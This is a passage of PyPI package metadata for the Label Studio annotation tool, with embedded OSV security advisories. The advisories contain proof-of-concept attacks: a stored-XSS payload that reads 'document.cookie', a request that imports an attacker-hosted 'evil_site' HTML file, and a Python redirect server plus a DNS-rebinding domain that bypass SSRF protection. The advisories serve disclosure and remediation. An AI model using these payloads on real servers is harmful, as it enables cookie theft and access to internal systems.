*/*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.10.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"Apache-2.0","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.10.1/","requires_dist":["Django (>=3.2.23,<3.3.0)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","azure-storage-blob (>=12.6.0)","bleach (>=5.0.0,<5.1.0)","boto (>=2.49.0,<3.0.0)","boto3 (>=1.28.58,<2.0.0)","botocore (>=1.31.58,<2.0.0)","boxing (>=0.1.4)","colorama (>=0.4.4)","defusedxml (>=0.7.1)","django-annoying (==0.10.6)","django-cors-headers (==3.6.0)","django-csp (==3.7)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-extensions (==3.1.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-ranged-fileresponse (>=0.1.2)","django-rq (==2.5.1)","django-storages (==1.12.3)","django-user-agents (==0.4.0)","djangorestframework (==3.13.1)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-generators (==0.3.0)","google-cloud-storage (>=2.13.0,<3.0.0)","htmlmin (==0.1.12)","humansignal-drf-yasg (>=1.21.9)","jsonschema (==3.2.0)","label-studio-converter (==0.0.57)","launchdarkly-server-sdk (==7.5.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","mysqlclient ; extra == \"mysql\"","numpy (>=1.24.3,<2.0.0)","ordered-set (==4.0.2)","pandas (>=0.24.0)","psycopg2-binary (==2.9.6)","pydantic (>=1.7.3,<=1.11.0)","python-dateutil (>=2.8.1)","python-json-logger (==2.0.4)","pytz (>=2022.1,<2023.0)","pyyaml (>=6.0.0)","redis (>=3.5,<4.0)","requests (==2.31.0)","rq (==1.10.1)","rules (==2.2)","sentry-sdk (>=1.1.0)","ujson (>=3.0.0)","urllib3 (>=1.26.18,<2.0.0)","wheel (>=0.38.1,<=0.40.0)","xmljson (==0.2.0)"],"requires_python":">=3.8,<4","summary":"Label Studio annotation tool","version":"1.10.1","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d348a634e39c3e45ecabedf3d2069edab6d85d6b91ac93d404c10c5748e4e58c","md5":"33885ab6f4dc88340fff03abe8464ea8","sha256":"346e4d9f792797577f40b0a3e7659e370b6f06cd51b08c3cfee5d4ce30c83609"},"downloads":-1,"filename":"label_studio-1.10.1-py3-none-any.whl","has_sig":false,"md5_digest":"33885ab6f4dc88340fff03abe8464ea8","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4","size":58931846,"upload_time":"2024-01-04T20:43:35","upload_time_iso_8601":"2024-01-04T20:43:35.340479Z","url":"https://files.pythonhosted.org/packages/d3/48/a634e39c3e45ecabedf3d2069edab6d85d6b91ac93d404c10c5748e4e58c/label_studio-1.10.1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"8b74d38aa1142f5b96bbe6b28931ed65c9ba9ec8a00ba06b582d792357805049","md5":"9fc097c798b21e3efd850b5189a35ab2","sha256":"f5398d15f7a5e49b43ca081aef949196a06e89726abf9e852e7ac2c2eeb0baad"},"downloads":-1,"filename":"label_studio-1.10.1.tar.gz","has_sig":false,"md5_digest":"9fc097c798b21e3efd850b5189a35ab2","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4","size":57636470,"upload_time":"2024-01-04T20:43:42","upload_time_iso_8601":"2024-01-04T20:43:42.823184Z","url":"https://files.pythonhosted.org/packages/8b/74/d38aa1142f5b96bbe6b28931ed65c9ba9ec8a00ba06b582d792357805049/label_studio-1.10.1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.11.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"Apache-2.0","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.11.0/","requires_dist":["Django (>=3.2.23,<3.3.0)","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","azure-storage-blob (>=12.6.0)","bleach (>=5.0.0,<5.1.0)","boto (>=2.49.0,<3.0.0)","boto3 (>=1.28.58,<2.0.0)","botocore (>=1.31.58,<2.0.0)","boxing (>=0.1.4)","colorama (>=0.4.4)","defusedxml (>=0.7.1)","django-annoying (==0.10.6)","django-cors-headers (==3.6.0)","django-csp (==3.7)","django-debug-toolbar (==3.2.1)","django-environ (==0.10.0)","django-extensions (==3.1.0)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-ranged-fileresponse (>=0.1.2)","django-rq (==2.5.1)","django-storages (==1.12.3)","django-user-agents (==0.4.0)","djangorestframework (==3.13.1)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-generators (==0.3.0)","google-cloud-storage (>=2.13.0,<3.0.0)","htmlmin (==0.1.12)","humansignal-drf-yasg (>=1.21.9)","jsonschema (==3.2.0)","label-studio-converter (==0.0.57)","launchdarkly-server-sdk (==7.5.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","mysqlclient ; extra == \"mysql\"","numpy (>=1.24.3,<2.0.0)","ordered-set (==4.0.2)","pandas (>=0.24.0)","psycopg2-binary (==2.9.6)","pydantic (>=1.7.3,<=1.11.0)","python-dateutil (>=2.8.1)","python-json-logger (==2.0.4)","pytz (>=2022.1,<2023.0)","pyyaml (>=6.0.0)","redis (>=3.5,<4.0)","requests (==2.31.0)","rq (==1.10.1)","rules (==2.2)","sentry-sdk (>=1.1.0)","ujson (>=3.0.0)","urllib3 (>=1.26.18,<2.0.0)","wheel (>=0.38.1,<=0.40.0)","xmljson (==0.2.0)"],"requires_python":">=3.8,<4","summary":"Label Studio annotation tool","version":"1.11.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"4c6635facb2d388dbda19770cc21db25b8c3122e70bc777822bf80bedd4a8eb6","md5":"e3edb5e44e96cb9490fed48b7ded2444","sha256":"7037aeecb34fdddb00fbf7922e888b3a5996cd0bbd2f618787c544c110d64963"},"downloads":-1,"filename":"label_studio-1.11.0-py3-none-any.whl","has_sig":false,"md5_digest":"e3edb5e44e96cb9490fed48b7ded2444","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.8,<4","size":81364149,"upload_time":"2024-01-30T21:47:26","upload_time_iso_8601":"2024-01-30T21:47:26.676692Z","url":"https://files.pythonhosted.org/packages/4c/66/35facb2d388dbda19770cc21db25b8c3122e70bc777822bf80bedd4a8eb6/label_studio-1.11.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"ebf70ee8c6c37d245c163a8781477e0f5d959ecd6e61a5b8417aa7f65cb6e0b7","md5":"6e1f4d4813da9a23ac1a4a014f6b23cd","sha256":"14b182155f3013307670445796c56f8e0f445004dda2fc27ae99e4124873b96a"},"downloads":-1,"filename":"label_studio-1.11.0.tar.gz","has_sig":false,"md5_digest":"6e1f4d4813da9a23ac1a4a014f6b23cd","packagetype":"sdist","python_version":"source","requires_python":">=3.8,<4","size":79968263,"upload_time":"2024-01-30T21:47:33","upload_time_iso_8601":"2024-01-30T21:47:33.003008Z","url":"https://files.pythonhosted.org/packages/eb/f7/0ee8c6c37d245c163a8781477e0f5d959ecd6e61a5b8417aa7f65cb6e0b7/label_studio-1.11.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.12.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.12.0/","requires_dist":["Django<3.3.0,>=3.2.24","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.1.0","django-filter==2.4.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.13.1","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","htmlmin==0.1.12","humansignal-drf-yasg>=1.21.9","jsonschema==3.2.0","label-studio-converter==0.0.58","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml>=4.2.5","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.24.3","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=0.24.0","psycopg2-binary==2.9.6","pydantic<=1.11.0,>=1.7.3","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests==2.31.0","rq==1.10.1","rules==2.2","sentry-sdk>=1.1.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.0"],"requires_python":"<4,>=3.8","summary":"Label Studio annotation tool","version":"1.12.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"8a22eac99aecd783fae69248ca413825841df20518d170353f16c00f5218d3d2","md5":"396af158cec8c688d6662c8fc7304482","sha256":"3d33f6d24a568ad5478feac2a7afaa38f34aeef595886489c15dafa978c66a76"},"downloads":-1,"filename":"label_studio-1.12.0-py3-none-any.whl","has_sig":false,"md5_digest":"396af158cec8c688d6662c8fc7304482","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.8","size":81473675,"upload_time":"2024-04-18T16:37:50","upload_time_iso_8601":"2024-04-18T16:37:50.638567Z","url":"https://files.pythonhosted.org/packages/8a/22/eac99aecd783fae69248ca413825841df20518d170353f16c00f5218d3d2/label_studio-1.12.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"74aef8b1ce301ff12854174305b0efbc69954000da076e972bcb1ab3e47964c9","md5":"6b1a0a57735a4d18ee2d69f3aeb69ca9","sha256":"fad5d4e766f9e7ce426112d2aec66c8ce62a50c7ea15d64e061c0858286a399b"},"downloads":-1,"filename":"label_studio-1.12.0.tar.gz","has_sig":false,"md5_digest":"6b1a0a57735a4d18ee2d69f3aeb69ca9","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.8","size":80067467,"upload_time":"2024-04-18T16:37:58","upload_time_iso_8601":"2024-04-18T16:37:58.833733Z","url":"https://files.pythonhosted.org/packages/74/ae/f8b1ce301ff12854174305b0efbc69954000da076e972bcb1ab3e47964c9/label_studio-1.12.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.12.0.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.12.0.post0/","requires_dist":["Django<3.3.0,>=3.2.24","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.1.0","django-filter==2.4.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.13.1","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","htmlmin==0.1.12","humansignal-drf-yasg>=1.21.9","jsonschema==3.2.0","label-studio-converter==0.0.58","launchdarkly-server-sdk==8.2.1","lockfile>=0.12.0","lxml>=4.2.5","mysqlclient; extra == \"mysql\"","numpy<2.0.0,>=1.24.3","openai<2.0.0,>=1.10.0","ordered-set==4.0.2","pandas>=0.24.0","psycopg2-binary==2.9.6","pydantic<=1.11.0,>=1.7.3","python-dateutil>=2.8.1","python-json-logger==2.0.4","pytz<2023.0,>=2022.1","pyyaml>=6.0.0","redis<4.0,>=3.5","requests==2.31.0","rq==1.10.1","rules==2.2","sentry-sdk>=1.1.0","ujson>=3.0.0","urllib3<2.0.0,>=1.26.18","wheel<=0.40.0,>=0.38.1","xmljson==0.2.0"],"requires_python":"<4,>=3.8","summary":"Label Studio annotation tool","version":"1.12.0.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"a18a867117bd3da45302568be5251da2742c62dc5a55d08635f568798809db3d","md5":"2569d63c90d356b3dda2cc7e7ccfd52e","sha256":"36b2f71f237378638b5e4f315a1a7868fe8eb26e7bee74f5546394077425c5bb"},"downloads":-1,"filename":"label_studio-1.12.0.post0-py3-none-any.whl","has_sig":false,"md5_digest":"2569d63c90d356b3dda2cc7e7ccfd52e","packagetype":"bdist_wheel","python_version":"py3","requires_python":"<4,>=3.8","size":81473819,"upload_time":"2024-05-06T19:31:38","upload_time_iso_8601":"2024-05-06T19:31:38.237431Z","url":"https://files.pythonhosted.org/packages/a1/8a/867117bd3da45302568be5251da2742c62dc5a55d08635f568798809db3d/label_studio-1.12.0.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"995313d27fbfa7e220e2346445cb0ff8611646192ea7b4dab1b90d8ac944a806","md5":"57176d1baf39dca2f4d342f80145cac8","sha256":"5d218a62e3a1f2bc8f5c1c5c23a3aa46043c6bf629000aad838463b6cf1b177c"},"downloads":-1,"filename":"label_studio-1.12.0.post0.tar.gz","has_sig":false,"md5_digest":"57176d1baf39dca2f4d342f80145cac8","packagetype":"sdist","python_version":"source","requires_python":"<4,>=3.8","size":80069247,"upload_time":"2024-05-06T19:31:45","upload_time_iso_8601":"2024-05-06T19:31:45.296162Z","url":"https://files.pythonhosted.org/packages/99/53/13d27fbfa7e220e2346445cb0ff8611646192ea7b4dab1b90d8ac944a806/label_studio-1.12.0.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[]},"1.12.1":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":null,"downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":null,"license":"Apache-2.0","maintainer":null,"maintainer_email":null,"name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.12.1/","requires_dist":["Django<3.3.0,>=3.2.24","appdirs>=1.4.3","attr==0.3.1","attrs>=19.2.0","azure-storage-blob>=12.6.0","bleach<5.1.0,>=5.0.0","boto<3.0.0,>=2.49.0","boto3<2.0.0,>=1.28.58","botocore<2.0.0,>=1.31.58","boxing>=0.1.4","colorama>=0.4.4","defusedxml>=0.7.1","django-annoying==0.10.6","django-cors-headers==3.6.0","django-csp==3.7","django-debug-toolbar==3.2.1","django-environ==0.10.0","django-extensions==3.1.0","django-filter==2.4.0","django-model-utils==4.1.1","django-ranged-fileresponse>=0.1.2","django-rq==2.5.1","django-storages==1.12.3","django-user-agents==0.4.0","djangorestframework==3.13.1","drf-dynamic-fields==0.3.0","drf-flex-fields==0.9.5","drf-generators==0.3.0","google-cloud-logging<4.0.0,>=3.10.0","google-cloud-storage<3.0.0,>=2.13.0","html